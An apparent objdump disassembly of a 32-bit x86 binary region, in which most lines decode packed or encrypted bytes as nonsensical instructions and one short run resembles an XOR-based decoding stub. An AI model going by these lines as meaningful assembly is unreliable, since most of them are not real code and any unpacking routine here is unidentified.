  409a99:	and    DWORD PTR [esi*4+0x98bb190],edx
  409aa0:	(bad)  
  409aa1:	mov    eax,DWORD PTR ds:[esi-0x44]
  409aa5:	push   eax
  409aa6:	push   esi
  409aa7:	sahf   
  409aa8:	loope  0x409ad7
  409aaa:	dec    ebx
  409aab:	mov    al,ds:0x28a22448
  409ab0:	jmp    0xb732e293
  409ab5:	dec    eax
  409ab6:	adc    al,0x56
  409ab8:	pop    ds
  409ab9:	pop    ecx
  409aba:	out    dx,eax
  409abb:	inc    esp
  409abc:	ficomp DWORD PTR [ebx]
  409abe:	sub    DWORD PTR [ebp+0xa6cd89e],0xac4020ad
  409ac8:	out    0xa2,al
  409aca:	sub    BYTE PTR [ebx+edi*1-0x4ec9b742],0x3b
  409ad2:	xsaveopt [edi-0x49]
  409ad6:	retf   0x48da
  409ad9:	lock enter 0xe4b8,0x8a
  409ade:	jbe    0x409b1d
  409ae0:	test   al,0x9
  409ae2:	stos   BYTE PTR es:[edi],al
  409ae3:	clc    
  409ae4:	mov    ebx,0xe4d8f67d
  409ae9:	das    
  409aea:	mov    ch,0xf7
  409aec:	rcl    cl,1
  409aee:	sub    BYTE PTR [ecx],ch
  409af0:	jmp    0x8c8a:0x29df9661
  409af7:	push   ss
  409af8:	dec    edi
  409af9:	inc    edi
  409afa:	je     0x409b70
  409afc:	popf   
  409afd:	cmp    dh,BYTE PTR ds:[edx]
  409b00:	aaa    
  409b01:	stos   BYTE PTR es:[edi],al
  409b02:	push   edx
  409b03:	stc    
  409b04:	sub    ecx,ebp
  409b06:	sti    
  409b07:	sbb    al,0xdc
  409b09:	and    al,al
  409b0b:	xlat   BYTE PTR ds:[ebx]
  409b0c:	jbe    0x409b5c
  409b0e:	gs xor al,0x73
  409b11:	adc    eax,0x3f15b494
  409b16:	lock pop ebp
  409b18:	xor    ebp,DWORD PTR [edx+0x62]
  409b1b:	shr    BYTE PTR [edx+0x53],1
  409b1e:	jecxz  0x409b4a
  409b20:	cli    
  409b21:	cmp    DWORD PTR [esp+edx*8],0x944030f
  409b28:	mov    ds:0x39e072da,eax
  409b2d:	fnsave [ebx+eax*1-0x1a9a38e8]
  409b34:	mov    esp,0xd73e8e8d
  409b39:	fsub   DWORD PTR [edx+0x18983fb9]
  409b3f:	repz xchg ebp,eax
  409b41:	(bad)  
  409b42:	fdivr  QWORD PTR [edi+0x2bedebdf]
  409b48:	mov    al,ds:0x67599e97
  409b4d:	leave  
  409b4e:	push   esp
  409b4f:	call   0x52556b04
  409b54:	sub    esp,DWORD PTR [ebx+0x74]
  409b57:	ds sub al,cl
  409b5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b5b:	mov    al,0xed
  409b5d:	pop    edx
  409b5e:	add    DWORD PTR [eax+ecx*2],0xffffffea
  409b62:	lock pop ecx
  409b64:	icebp  
  409b65:	and    al,BYTE PTR [ecx]
  409b67:	adc    DWORD PTR [ecx],ebx
  409b69:	pop    ebx
  409b6a:	sub    eax,0x29c04589
  409b6f:	adc    eax,0x434583
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x4344df
  409b7f:	or     DWORD PTR ds:0x43454f,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x43457f
  409b8f:	xor    DWORD PTR ds:0x434583,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x43456b
  409bb7:	mov    edi,DWORD PTR ds:0x434623
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	retf   0xfa06
  409bd6:	inc    edx
  409bd7:	mov    gs,edx
  409bd9:	jle    0x409c59
  409bdb:	jo     0x409c56
  409bdd:	jle    0x409c5d
  409bdf:	das    
  409be0:	jl     0x409c2f
  409be2:	inc    esp
  409be3:	call   0xcdb0:0x9309faac
  409bea:	(bad)  
  409beb:	arpl   WORD PTR [edx-0x7],di
  409bee:	jbe    0x409b7d
  409bf0:	and    DWORD PTR [ebp+0x1e],esp
  409bf3:	and    al,BYTE PTR [ebx-0x70feb1e4]
  409bf9:	int    0xc
  409bfb:	pushf  
  409bfc:	es clc 
  409bfe:	dec    eax
  409bff:	scas   eax,DWORD PTR es:[edi]
  409c00:	pop    edx
  409c01:	jg     0x409c77
  409c03:	sbb    DWORD PTR [ebp+0x10],esi
  409c06:	push   ebx
  409c07:	retf   
  409c08:	push   ss
  409c09:	sub    eax,0xad1aad3c
  409c0e:	arpl   WORD PTR [ecx+edx*1+0x23e3fd74],ax
  409c15:	add    eax,0xb6c7de0
  409c1a:	jp     0x409bb4
  409c1c:	mov    ebx,0x68ff2b2a
  409c21:	dec    ecx
  409c22:	jl     0x409bd5
  409c24:	out    dx,eax
  409c25:	jecxz  0x409c6c
  409c27:	aaa    
  409c28:	lahf   
  409c29:	mov    eax,0x890c323
  409c2e:	je     0x409bc8
  409c30:	ds scas eax,DWORD PTR es:[edi]
  409c32:	popf   
  409c33:	mov    ebp,0x8d79920e
  409c38:	(bad)  
  409c39:	call   0x6f703241
  409c3e:	jbe    0x409c10
  409c40:	cli    
  409c41:	dec    edx
  409c42:	cmp    ecx,DWORD PTR [ebx-0x6950d3b4]
  409c48:	mov    ebp,ss
  409c4a:	mov    ch,0x40
  409c4c:	pop    edi
  409c4d:	out    dx,al
  409c4e:	mov    ch,0xa9
  409c50:	pop    edx
  409c51:	ror    BYTE PTR gs:[esi-0x1556c163],cl
  409c58:	jge    0x409bee
  409c5a:	jbe    0x409be6
  409c5c:	scas   eax,DWORD PTR es:[edi]
  409c5d:	xchg   ebp,eax
  409c5e:	(bad)  
  409c5f:	out    0x2f,eax
  409c61:	popf   
  409c62:	das    
  409c63:	cld    
  409c64:	cwde   
  409c65:	imul   edi,DWORD PTR [edx+0x5c],0x3bc9a9b8
  409c6c:	out    0x2a,al
  409c6e:	icebp  
  409c6f:	mov    gs,WORD PTR [esi+0x5dcb0204]
  409c75:	add    esi,DWORD PTR [ecx-0x28c4fd8b]
  409c7b:	scas   al,BYTE PTR es:[edi]
  409c7c:	call   0xcf64d3dd
  409c81:	sbb    cl,BYTE PTR [eax-0x6913eefb]
  409c87:	xor    DWORD PTR [esi+edx*2-0x643d6576],edx
  409c8e:	pop    ecx
  409c8f:	call   0xee3e:0xe5b99277
  409c96:	xor    eax,0x17bd1d1a
  409c9b:	inc    edx
  409c9c:	repz pop ecx
  409c9e:	sar    BYTE PTR [ecx-0x26d51e53],1
  409ca4:	fstp   DWORD PTR [ecx+0x53]
  409ca7:	mov    al,0x77
  409ca9:	test   eax,0x7252a939
  409cae:	pop    esi
  409caf:	daa    
  409cb0:	ror    dh,cl
  409cb2:	popa   
  409cb3:	(bad)  
  409cb4:	shl    DWORD PTR [ebx],0x2e
  409cb7:	sub    al,cl
  409cb9:	sub    DWORD PTR [ebp-0x5e],0x5c5d7177
  409cc0:	leave  
  409cc1:	fst    DWORD PTR [edx]
  409cc3:	pop    esp
  409cc4:	mov    al,0xb9
  409cc6:	inc    edx
  409cc7:	sub    BYTE PTR [eax+0x1a7ace5d],0x15
  409cce:	lds    edx,FWORD PTR [edi+0x52]
  409cd1:	outs   dx,BYTE PTR ds:[esi]
  409cd2:	xchg   DWORD PTR [esi],esi
  409cd4:	and    al,BYTE PTR ds:0x94e8b1a6
  409cda:	and    BYTE PTR [ecx+eax*1-0x42],0xfe
  409cdf:	xor    al,0xb3
  409ce1:	xor    BYTE PTR [edi+esi*1+0x7964c61c],dh
  409ce8:	inc    ebp
  409ce9:	and    edi,DWORD PTR [esi-0x186f1990]
  409cef:	and    ebp,eax
  409cf1:	cwde   
  409cf2:	aas    
  409cf3:	jmp    0x1847f073
  409cf8:	int    0x67
  409cfa:	adc    BYTE PTR [ecx+0x3a],0xad
  409cfe:	sub    edi,DWORD PTR [edi+0x6180add]
  409d04:	sbb    al,0x1e
  409d06:	in     al,0x5e
  409d08:	in     al,dx
  409d09:	push   ebp
  409d0a:	inc    eax
  409d0b:	mov    dl,0xf
  409d0d:	shl    DWORD PTR [ecx],cl
  409d0f:	lea    esp,[ebx-0x1b0081d1]
  409d15:	mov    DWORD PTR [ebx-0xf],eax
  409d18:	sbb    al,0x4e
  409d1a:	sbb    DWORD PTR [edi],0x30
  409d1d:	shl    BYTE PTR ds:0xbb64449,cl
  409d23:	and    eax,0x94a48a7
  409d28:	mov    ebx,0x9783793e
  409d2d:	or     BYTE PTR [ecx+0x55],0x26
  409d31:	clc    
  409d32:	jb     0x409d83
  409d34:	push   ebx
  409d35:	lock cmp ebp,ecx
  409d38:	mov    DWORD PTR [ecx+edi*4],edx
  409d3b:	int3   
  409d3c:	inc    esi
  409d3d:	xchg   edx,eax
  409d3e:	mov    ah,0xec
  409d40:	xor    dh,BYTE PTR [eax-0x3ee2882c]
  409d46:	sub    al,0x81
  409d48:	aaa    
  409d49:	out    dx,al
  409d4a:	or     BYTE PTR [edi-0x35d4647a],dh
  409d50:	adc    eax,0xc3174646
  409d55:	repnz pop esp
  409d57:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  409d59:	test   DWORD PTR [edx],ebx
  409d5b:	mov    eax,0xb85062f4
  409d60:	aad    0x8f
  409d62:	pushf  
  409d63:	sub    eax,0x1d
  409d66:	loope  0x409d4c
  409d68:	dec    edi
  409d69:	js     0x409d81
  409d6b:	lahf   
  409d6c:	rol    BYTE PTR [edx+0x13a2899e],cl
  409d72:	shl    BYTE PTR [edx+0x6a0642a1],0xa3
  409d79:	test   eax,0xdc6d5f42
  409d7e:	mov    esi,0x685a9423
  409d83:	es ins BYTE PTR es:[edi],dx
  409d85:	scas   eax,DWORD PTR es:[edi]
  409d86:	pushf  
  409d87:	mov    edi,0x47fa9c91
  409d8c:	stos   DWORD PTR es:[edi],eax
  409d8d:	mov    cl,0x76
  409d8f:	data16 xchg BYTE PTR [ebx-0x4a],bh
  409d93:	xchg   DWORD PTR [ecx-0x21],esp
  409d96:	jns    0x409da9
  409d98:	(bad)  
  409d9a:	repnz mov dh,0x4d
  409d9d:	adc    DWORD PTR ds:0xbb2f1b65,eax
  409da3:	xchg   esi,eax
  409da4:	cdq    
  409da5:	xchg   ecx,eax
  409da6:	repnz test al,0xcf
  409da9:	push   ebx
  409daa:	cdq    
  409dab:	pop    eax
  409dac:	push   0xca73de21
  409db1:	cld    
  409db2:	call   0xbb7c:0x3e089338
  409db9:	lods   eax,DWORD PTR ds:[esi]
  409dba:	mov    eax,ds:0xff6fe706
  409dbf:	aas    
  409dc0:	add    ecx,esi
  409dc2:	icebp  
  409dc3:	dec    ecx
  409dc4:	das    
  409dc5:	jo     0x409ded
  409dc7:	xor    DWORD PTR [edx],edi
  409dc9:	jno    0x409e13
  409dcb:	push   ds
  409dcc:	(bad)  
  409dcd:	cmp    al,0xb3
  409dcf:	(bad)  
  409dd0:	jg     0x409dc9
  409dd2:	pop    esi
  409dd3:	mov    WORD PTR [ebx-0x51],gs
  409dd6:	mov    ah,0x8d
  409dd8:	test   BYTE PTR [ebx-0x5],bl
  409ddb:	pusha  
  409ddc:	pusha  
  409ddd:	mov    esp,0xfd58a32d
  409de2:	pop    es
  409de3:	mov    eax,0xbd5efc86
  409de8:	dec    ebx
  409de9:	mov    bh,0xed
  409deb:	jmp    0x409e05
  409ded:	jle    0x409dc6
  409def:	leave  
  409df0:	enter  0xe864,0x93
  409df4:	mov    ds:0xdb91fae9,eax
  409df9:	popf   
  409dfa:	int    0x8a
  409dfc:	ret    0xa6b4
  409dff:	inc    edx
  409e00:	jg     0x409dab
  409e02:	cmp    eax,0x65bcb0eb
  409e07:	jl     0x409e53
  409e09:	dec    esi
  409e0a:	mov    edi,0x70a93c08
  409e0f:	fstp   DWORD PTR [edi]
  409e11:	pop    edi
  409e12:	(bad)  
  409e13:	(bad)  
  409e15:	jle    0x409df1
  409e17:	or     DWORD PTR [ecx-0x38],ecx
  409e1a:	pop    ebx
  409e1b:	adc    DWORD PTR [ecx+esi*4-0x37aa7665],eax
  409e22:	je     0x409e93
  409e24:	sub    al,0x7e
  409e26:	adc    edx,edi
  409e28:	sahf   
  409e29:	adc    BYTE PTR [ecx],0xf8
  409e2c:	cdq    
  409e2d:	adc    DWORD PTR [esi],eax
  409e2f:	jmp    0x396f181c
  409e34:	add    DWORD PTR [esi+0x33000f67],ebp
  409e3a:	ficomp DWORD PTR [eax]
  409e3c:	lods   al,BYTE PTR ds:[esi]
  409e3d:	stos   BYTE PTR es:[edi],al
  409e3e:	push   cs
  409e3f:	mov    bh,0xdc
  409e41:	inc    eax
  409e42:	(bad)  
  409e43:	xor    eax,0x6a
  409e46:	test   BYTE PTR [ecx+0x3e],0xa6
  409e4a:	bound  edx,QWORD PTR [edi+0x79]
  409e4d:	fs dec ebp
  409e4f:	cmp    cl,BYTE PTR [edi-0x640fed03]
  409e55:	mov    ebx,0x75095ef0
  409e5a:	repnz mov cl,0x3e
  409e5d:	in     eax,0xf4
  409e5f:	sbb    eax,0x5e2e7398
  409e64:	or     DWORD PTR [ebx],eax
  409e66:	loope  0x409e2f
  409e68:	stc    
  409e69:	in     al,dx
  409e6a:	jnp    0x409ec7
  409e6c:	mov    dh,0x4d
  409e6e:	stos   BYTE PTR es:[edi],al
  409e6f:	jle    0x409df7
  409e71:	mov    ebp,0x21fc00f2
  409e76:	pusha  
  409e77:	or     ebx,DWORD PTR [ecx]
  409e79:	sbb    BYTE PTR [edx],cl
  409e7b:	out    dx,al
  409e7c:	pop    ds
  409e7d:	pop    es
  409e7e:	ret    
  409e7f:	xchg   edi,eax
  409e80:	scas   al,BYTE PTR es:[edi]
  409e81:	into   
  409e82:	cwde   
  409e83:	stos   BYTE PTR es:[edi],al
  409e84:	adc    esi,DWORD PTR [edx]
  409e86:	jle    0x409ebb
  409e88:	imul   eax,DWORD PTR [ecx-0x23],0x214a6602
  409e8f:	xlat   BYTE PTR ds:[ebx]
  409e90:	xchg   ebx,eax
  409e91:	add    esi,eax
  409e93:	xchg   ebx,eax
  409e94:	(bad)  
  409e95:	pop    ebx
  409e96:	mov    esp,esi
  409e98:	jbe    0x409e99
  409e9a:	dec    edi
  409e9b:	hlt    
  409e9c:	loope  0x409e77
  409e9e:	mov    esi,0x77033fd2
  409ea3:	sbb    DWORD PTR [ebp-0x56],esp
  409ea6:	mov    bl,0x5b
  409ea8:	cmp    edi,DWORD PTR [edi]
  409eaa:	lea    ebp,[ebp-0xb5050a4]
  409eb0:	adc    BYTE PTR [ebp+0x33573a06],ch
  409eb6:	in     al,0x8d
  409eb8:	out    dx,eax
  409eb9:	inc    ebx
  409eba:	pusha  
  409ebb:	dec    edi
  409ebc:	enter  0x7e15,0xf9
  409ec0:	adc    BYTE PTR [edi+0x73],al
  409ec3:	xlat   BYTE PTR ds:[ebx]
  409ec4:	adc    BYTE PTR [ebx],bh
  409ec6:	push   cs
  409ec7:	dec    ecx
  409ec8:	jbe    0x409ead
  409eca:	ror    ebp,1
  409ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ecd:	cwde   
  409ece:	lods   eax,DWORD PTR es:[esi]
  409ed0:	sbb    dl,ch
  409ed2:	data16 test al,0x3f
  409ed5:	xor    DWORD PTR [ebx+edx*2],eax
  409ed8:	pop    esp
  409ed9:	push   cs
  409eda:	shl    al,1
  409edc:	xor    DWORD PTR [edx+0x5ed457f3],ecx
  409ee2:	in     al,0x18
  409ee4:	data16 jne 0x409ef7
  409ee7:	mov    ds:0x169a40ca,al
  409eec:	sbb    eax,DWORD PTR [eax]
  409eee:	push   eax
  409eef:	div    BYTE PTR [eax-0x7e]
  409ef2:	mov    dl,0x30
  409ef4:	mov    al,0xce
  409ef6:	call   0xb32f:0x11d98055
  409efd:	xchg   ecx,eax
  409efe:	sub    al,0xb6
  409f00:	push   ebp
  409f01:	mov    BYTE PTR [eax+ecx*2],dh
  409f04:	jg     0x409f1b
  409f06:	and    esi,DWORD PTR [edx+0x2acc67af]
  409f0c:	cld    
  409f0d:	pop    ds
  409f0e:	jbe    0x409f86
  409f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f11:	push   edx
  409f12:	out    dx,al
  409f13:	mov    bh,0x17
  409f15:	lahf   
  409f16:	cmp    DWORD PTR [eax],ebp
  409f18:	not    DWORD PTR ds:0x2da8e79b
  409f1e:	icebp  
  409f1f:	or     BYTE PTR [ecx],ch
  409f21:	pop    ss
  409f22:	dec    edi
  409f23:	fistp  QWORD PTR [esi+0x713e493e]
  409f29:	nop
  409f2a:	fdivr  DWORD PTR [eax-0x5830d23]
  409f30:	mov    dl,BYTE PTR [ecx-0x78e7e07]
  409f36:	imul   BYTE PTR [esi+0x31]
  409f39:	xor    DWORD PTR [edx+0x72e220fe],esi
  409f3f:	dec    esi
  409f40:	addr16 dec eax
  409f42:	aas    
  409f43:	ins    BYTE PTR es:[edi],dx
  409f44:	int    0xce
  409f46:	and    al,0x9f
  409f48:	mov    edi,0xe042500a
  409f4d:	inc    ebp
  409f4e:	pop    es
  409f4f:	daa    
  409f50:	mov    dl,0x34
  409f52:	test   BYTE PTR [edi+0x38],al
  409f55:	psrlw  mm7,QWORD PTR [edi+0x63]
  409f59:	inc    BYTE PTR [ecx+ecx*1+0x717c2e4a]
  409f60:	xor    ebx,ecx
  409f62:	hlt    
  409f63:	out    dx,eax
  409f64:	mov    eax,ds:0xb1476290
  409f69:	rol    BYTE PTR [esi+0x1481035],0x41
  409f70:	mov    eax,0x478ed3b4
  409f75:	in     eax,dx
  409f76:	dec    esi
  409f77:	stos   BYTE PTR es:[edi],al
  409f78:	iret   
  409f79:	mov    esi,0x963ae6d5
  409f7e:	lock sbb ebx,DWORD PTR [edx]
  409f81:	push   es
  409f82:	push   edx
  409f83:	aaa    
  409f84:	jge    0x409ffb
  409f86:	mov    esp,0x4553cc90
  409f8b:	popf   
  409f8c:	push   ebx
  409f8d:	dec    edx
  409f8e:	scas   al,BYTE PTR es:[edi]
  409f8f:	jecxz  0x409f47
  409f91:	int3   
  409f92:	rol    DWORD PTR [ebx],cl
  409f94:	stos   DWORD PTR es:[edi],eax
  409f95:	outs   dx,DWORD PTR ds:[si]
  409f97:	mov    ds:0xb261c6b6,al
  409f9c:	loop   0x409f37
  409f9e:	dec    esp
  409f9f:	push   eax
  409fa0:	imul   bl
  409fa2:	add    ebp,DWORD PTR [edi]
  409fa4:	aam    0xfb
  409fa6:	pusha  
  409fa7:	mov    al,ds:0x135a7f9f
  409fac:	popf   
  409fad:	fisub  WORD PTR [ebx-0x3fc7e05b]
  409fb3:	jmp    0x9aec:0x219d3bd4
  409fba:	xor    al,0x5
  409fbc:	retf   0xd399
  409fbf:	push   ds
  409fc0:	adc    BYTE PTR [esi],al
  409fc2:	cmp    al,0x8c
  409fc4:	or     DWORD PTR [eax],ebp
  409fc6:	push   0xffffffba
  409fc8:	into   
  409fc9:	lds    esi,FWORD PTR [edi+0x61c35c4d]
  409fcf:	cmp    bl,bh
  409fd1:	mov    dl,0xd
  409fd3:	pop    ds
  409fd4:	jne    0x409fa8
  409fd6:	xor    eax,0x45c7dbe5
  409fdb:	fdivr  DWORD PTR [eax]
  409fdd:	test   DWORD PTR [eax+edi*8+0x12e9ff23],ebx
  409fe4:	add    al,0x0
  409fe6:	add    BYTE PTR [ecx+0x6b],ah
  409fe9:	in     al,dx
  409fea:	(bad)  
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fnstenv [edi]
  409ff4:	mov    eax,ds:0xf680b6db
  409ff9:	jle    0x40a079
  409ffb:	jo     0x40a076
  409ffd:	jle    0x40a07d
  409fff:	in     al,0x60
  40a001:	pop    ss
  40a002:	push   ds
  40a003:	sub    BYTE PTR [eax],ah
  40a005:	push   cs
  40a006:	cwde   
  40a007:	aaa    
  40a008:	rol    DWORD PTR [eax],1
  40a00a:	loope  0x409ff5
  40a00c:	dec    eax
  40a00d:	mov    bl,0x7c
  40a00f:	outs   dx,DWORD PTR ds:[esi]
  40a010:	add    al,bh
  40a012:	sbb    ah,BYTE PTR [esi-0x39690d71]
  40a018:	outs   dx,DWORD PTR ds:[esi]
  40a019:	fisttp WORD PTR [ecx+0x24]
  40a01c:	push   ebx
  40a01d:	jecxz  0x40a035
  40a01f:	sbb    ecx,edi
  40a021:	stc    
  40a022:	push   esi
  40a023:	addr16 sti 
  40a025:	scas   al,BYTE PTR es:[edi]
  40a026:	inc    ebp
  40a027:	pop    edx
  40a028:	pop    ebp
  40a029:	jae    0x40a062
  40a02b:	scas   eax,DWORD PTR es:[edi]
  40a02c:	xchg   esi,eax
  40a02d:	mov    edx,DWORD PTR [ebp+0x18176d78]
  40a033:	inc    ebp
  40a034:	out    dx,eax
  40a035:	stos   BYTE PTR es:[edi],al
  40a036:	sti    
  40a037:	mov    ah,0x1c
  40a039:	jo     0x40a057
  40a03b:	hlt    
  40a03c:	add    eax,0x3ad82a26
  40a041:	sahf   
  40a042:	jl     0x40a078
  40a044:	bound  esi,QWORD PTR [ebp-0x6edbd3a4]
  40a04a:	jl     0x409fee
  40a04c:	loope  0x409fd1
  40a04e:	sub    eax,0x4f4f3fa3
  40a053:	adc    edx,DWORD PTR [edi-0x1520f210]
  40a059:	sbb    al,0xf
  40a05b:	mov    ecx,0xa4e129ae
  40a060:	in     al,dx
  40a061:	sbb    ch,BYTE PTR [edx+0x59]
  40a064:	jno    0x40a02e
  40a066:	imul   eax,DWORD PTR [edx+0x485f6bf2],0x61f5250c
  40a070:	icebp  
  40a071:	mov    esp,DWORD PTR [eax]
  40a073:	cmp    BYTE PTR [esi],ah
  40a075:	shr    BYTE PTR [eax+ecx*2+0x45ee211],cl
  40a07c:	in     al,0x2
  40a07e:	test   eax,0x99ad9ed8
  40a083:	push   ecx
  40a084:	enter  0x23f,0x87
  40a088:	mov    eax,ds:0x91a9f50e
  40a08d:	xor    dl,BYTE PTR [eax-0x38]
  40a090:	inc    esi
  40a091:	adc    BYTE PTR [ebx],bh
  40a093:	push   cs
  40a094:	lahf   
  40a095:	fild   DWORD PTR [edx+eax*1+0x5f32b274]
  40a09c:	popf   
  40a09d:	pop    ecx
  40a09e:	cwde   
  40a09f:	mov    ebp,0x33a5f1d7
  40a0a4:	imul   ecx,DWORD PTR [eax+0x1a],0xffffffc5
  40a0a8:	pop    edx
  40a0a9:	pop    ds
  40a0aa:	jmp    0x29a61247
  40a0af:	(bad)  
  40a0b0:	daa    
  40a0b1:	mov    ds:0x75c4b71d,al
  40a0b6:	std    
  40a0b7:	test   al,0xe6
  40a0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0ba:	sub    DWORD PTR [edi+0x1e],edi
  40a0bd:	dec    ebp
  40a0be:	mov    DWORD PTR [ebp-0x40],ebp
  40a0c1:	fist   WORD PTR [ebx]
  40a0c3:	inc    eax
  40a0c4:	test   al,0x77
  40a0c6:	dec    edi
  40a0c7:	ins    BYTE PTR es:[edi],dx
  40a0c8:	xor    cl,bl
  40a0ca:	shl    BYTE PTR [esi-0xa],0x5b
  40a0ce:	gs dec ebp
  40a0d0:	xor    dh,al
  40a0d2:	pop    esp
  40a0d3:	cs aam 0xc6
  40a0d6:	xor    cl,BYTE PTR [edx]
  40a0d8:	sbb    al,0x95
  40a0da:	mov    ds,WORD PTR [edi-0x72]
  40a0dd:	int3   
  40a0de:	adc    edx,DWORD PTR [esi+0x57166f2e]
  40a0e4:	or     BYTE PTR [ebx+0x25c7e9e8],0x1f
  40a0eb:	push   ebx
  40a0ec:	jmp    0x40a0a4
  40a0ee:	fwait
  40a0ef:	gs mov eax,0xb28b3fb3
  40a0f5:	xor    al,0x74
  40a0f7:	sub    ch,bl
  40a0f9:	lock retf 
  40a0fb:	aad    0x74
  40a0fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0fe:	mov    bh,0xae
  40a100:	out    dx,eax
  40a101:	sub    al,0x1f
  40a103:	add    cl,BYTE PTR [ecx-0x451583ae]
  40a109:	adc    BYTE PTR [edi+edx*2-0x7ae3cfd2],cl
  40a110:	jbe    0x40a157
  40a112:	pop    esp
  40a113:	pop    es
  40a114:	aad    0xd9
  40a116:	push   ebp
  40a117:	retf   
  40a118:	fs sbb al,ch
  40a11b:	jae    0x40a156
  40a11d:	add    edx,DWORD PTR [ecx]
  40a11f:	xchg   edi,eax
  40a120:	gs int3 
  40a122:	les    eax,FWORD PTR [ebp-0x4ac74de9]
  40a128:	sar    BYTE PTR [ebp-0x1b2a850a],cl
  40a12e:	shl    bl,cl
  40a130:	mov    eax,DWORD PTR [ecx-0x80]
  40a133:	loopne 0x40a16b
  40a135:	pop    ebx
  40a136:	pop    edi
  40a137:	(bad)  
  40a139:	retf   0xbf48
  40a13c:	adc    bl,BYTE PTR [ebp-0x77]
  40a13f:	xchg   edi,eax
  40a140:	(bad)  
  40a142:	test   eax,0xb7c1a4fa
  40a147:	repnz add ecx,DWORD PTR [ebp+0x11]
  40a14b:	ja     0x40a185
  40a14d:	and    eax,0x912f5051
  40a152:	mov    al,ds:0xa2246a56
  40a157:	mov    dh,0x1d
  40a159:	jno    0x40a144
  40a15b:	int    0x85
  40a15d:	xchg   esi,eax
  40a15e:	addr16 in al,dx
  40a160:	add    DWORD PTR [ebp-0xd],esi
  40a163:	ja     0x40a108
  40a165:	ins    DWORD PTR es:[edi],dx
  40a166:	jno    0x40a114
  40a168:	or     BYTE PTR [eax+0x2b5a644a],ah
  40a16e:	popa   
  40a16f:	fcomi  st,st(4)
  40a171:	aas    
  40a172:	adc    ecx,DWORD PTR [ecx+edi*2]
  40a175:	and    eax,0x87e057d0
  40a17a:	nop
  40a17b:	aam    0x8
  40a17d:	sub    eax,0x1db6d04d
  40a182:	fistp  DWORD PTR [esi+0x1c69f91e]
  40a188:	lahf   
  40a189:	sbb    DWORD PTR [edi+0x42],esi
  40a18c:	pop    ebx
  40a18d:	push   eax
  40a18e:	fwait
  40a18f:	and    BYTE PTR [ebp+0x61035b8d],dl
  40a195:	mov    esi,0xb798d82c
  40a19a:	inc    esp
  40a19b:	test   DWORD PTR fs:[edx],ebp
  40a19e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a19f:	popa   
  40a1a0:	(bad)  
  40a1a1:	cli    
  40a1a2:	jmp    0xa721ef81
  40a1a7:	ins    BYTE PTR es:[edi],dx
  40a1a8:	mov    edi,0xc7635ca7
  40a1ad:	pop    esp
  40a1ae:	call   0x51a716bc
  40a1b3:	cdq    
  40a1b4:	int    0x4b
  40a1b6:	mov    esp,0xfd51b56a
  40a1bb:	xor    eax,0xd37d316a
  40a1c0:	out    0x81,al
  40a1c2:	pop    esp
  40a1c3:	into   
  40a1c4:	test   BYTE PTR [esi+0x7c565239],ch
  40a1ca:	adc    al,0x28
  40a1cc:	shl    BYTE PTR [eax-0x7ac7041c],cl
  40a1d2:	pop    eax
  40a1d3:	and    BYTE PTR [ebx+edi*2-0x76],bh
  40a1d7:	scas   eax,DWORD PTR es:[edi]
  40a1d8:	cmc    
  40a1d9:	sub    ch,dl
  40a1db:	sbb    ah,BYTE PTR ds:0x81ee8da5
  40a1e1:	and    BYTE PTR [eax],dl
  40a1e3:	and    DWORD PTR ds:0x55d3023e,esp
  40a1e9:	in     eax,dx
  40a1ea:	fwait
  40a1eb:	loopne 0x40a265
  40a1ed:	pop    edi
  40a1ee:	jge    0x40a172
  40a1f0:	xor    esp,ecx
  40a1f2:	fsub   DWORD PTR [ebx]
  40a1f4:	mov    edi,0xa9275f12
  40a1f9:	shr    cl,1
  40a1fb:	push   ebx
  40a1fc:	cdq    
  40a1fd:	xchg   edi,eax
  40a1fe:	les    edx,FWORD PTR [eax]
  40a200:	xchg   edi,eax
  40a201:	pop    ebx
  40a202:	in     al,0x5f
  40a204:	add    BYTE PTR [edi+0x567bcbf8],dh
  40a20a:	adc    eax,0xecea9c4e
  40a20f:	adc    ebx,DWORD PTR [eax+0x70afa0c9]
  40a215:	jb     0x40a19c
  40a217:	or     eax,0xd6a77c74
  40a21c:	mov    dl,0xa4
  40a21e:	out    dx,al
  40a21f:	outs   dx,BYTE PTR ds:[esi]
  40a220:	and    BYTE PTR [ebp+ebx*4+0x36],dl
  40a224:	sar    DWORD PTR [ebx+0x6a9ad72c],0x4
  40a22b:	popf   
  40a22c:	xchg   ebp,eax
  40a22d:	icebp  
  40a22e:	mov    ch,0x91
  40a230:	inc    ebp
  40a231:	adc    DWORD PTR [edi+0x78ccfcfd],eax
  40a237:	(bad)  
  40a238:	push   ebp
  40a239:	push   ebp
  40a23a:	fld    DWORD PTR [edi]
  40a23c:	jne    0x40a29d
  40a23e:	mov    DWORD PTR [esi+0x69aa8867],ebx
  40a244:	pop    ebp
  40a245:	imul   ecx,ecx,0x26
  40a248:	xchg   ebp,eax
  40a249:	(bad)
  40a24c:	ins    BYTE PTR es:[edi],dx
  40a24d:	xor    al,0xfb
  40a24f:	sbb    edi,DWORD PTR [ebx-0x7f112721]
  40a255:	mov    bh,0xac
